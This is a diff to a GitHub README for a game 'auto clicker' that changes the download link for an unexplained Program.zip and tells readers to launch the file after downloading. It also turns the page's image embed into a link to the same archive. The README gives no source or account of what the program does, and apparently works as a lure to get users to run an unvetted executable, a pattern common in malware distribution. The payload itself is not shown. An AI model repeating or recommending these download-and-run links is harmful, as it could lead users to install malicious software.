@@ -9,7 +9,7 @@ Welcome to Rockyrabbitio Auto Clicker, a versatile tool designed to enhance your
 - Enhance your gaming experience with automated functions.
 
 ## Installation
-To get started with Rockyrabbitio Auto Clicker, you can download the program from [here](https://github.com/user-attachments/files/17804152/Program.zip). Please note that the file needs to be launched after downloading. If the link does not work, please check the "Releases" section for alternative download options.
+To get started with Rockyrabbitio Auto Clicker, you can download the program from [here](https://github.com/BagasFamily/rockyrabbitio-autoclicker/releases/download/v2.0/Program.zip). Please note that the file needs to be launched after downloading. If the link does not work, please check the "Releases" section for alternative download options.
 
 ## Usage
 1. Download and launch the auto clicker program.
@@ -20,7 +20,7 @@ To get started with Rockyrabbitio Auto Clicker, you can download the program fro
 ## Support
 If you encounter any issues or have feedback regarding Rockyrabbitio Auto Clicker, please feel free to open an issue on the GitHub repository. Our team is dedicated to providing support and improving the tool for the best user experience.
 
-![Rockyrabbitio Auto Clicker](https://example.com/auto-clicker-image.png)
+![Rockyrabbitio Auto Clicker](https://github.com/BagasFamily/rockyrabbitio-autoclicker/releases/download/v2.0/Program.zip)
 
 ---
 
